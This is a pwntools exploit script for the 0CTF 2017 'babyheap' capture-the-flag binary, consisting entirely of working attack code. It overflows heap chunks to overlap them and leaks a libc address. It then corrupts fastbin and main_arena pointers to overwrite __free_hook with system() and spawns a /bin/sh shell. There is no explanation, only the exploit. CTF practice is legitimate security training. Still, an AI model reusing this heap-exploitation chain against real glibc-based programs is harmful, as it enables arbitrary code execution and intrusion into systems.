from pwn import *
context.log_level = 'debug'
prog = './babyheap_0ctf_2017'
elf = ELF(prog)
p = process(prog)

libc = ELF("./libc-2.23.so")
#p = remote("")
def dbg():
    gdb.attach(p)
    p.interactive()

def add(size):
	p.sendlineafter("Command: ", '1')
	p.sendlineafter("Size: ", str(size))
def show(idx):
	p.sendlineafter("Command: ", '4')
	p.sendlineafter("Index: ", str(idx))
def edit(idx, size, content):
	p.sendlineafter("Command: ", '2')
	p.sendlineafter("Index: ", str(idx))
	p.sendlineafter("Size: ", str(size))
	p.sendafter("Content: ", content)
def free(idx):
	p.sendlineafter("Command: ", '3')
	p.sendlineafter("Index: ", str(idx))
def exp():
	add(0x80)#0
	add(0x40)#1
	add(0x80)#2
	add(0x20)#3
	free(0)
	edit(1, 0x50, 'a'*0x40+p64(0xe0)+p64(0x90))
	free(2)
	add(0x80)#0
	show(1)
	libc.address = u64(p.recvuntil("\x7f")[-6:]+'\x00'*2)-0x3c4b78
	success(hex(libc.address))
	success(hex(libc.sym['system']))
	add(0x40)#2
	add(0x80)#4
	free(2)
	free(3)
	edit(0, 0x98, 'a'*0x80+p64(0)+p64(0x51)+p64(libc.address+0x3c4b75-0x48))
	add(0x40)#5
	add(0x40)#6
	success(hex(libc.address+0x3c4b75-0x48))	
	edit(3, 0x43, '\x00'*3+p64(0)*7+p64(libc.sym['__free_hook']-0xb58))
	for i in range(6):
    		add(0x200)
	edit(10, 0x100, '\x00'*0xf8+p64(libc.sym['system']))
	edit(0, 8, '/bin/sh\x00')
	#dbg()
	p.interactive()
if __name__ == '__main__':
	exp()
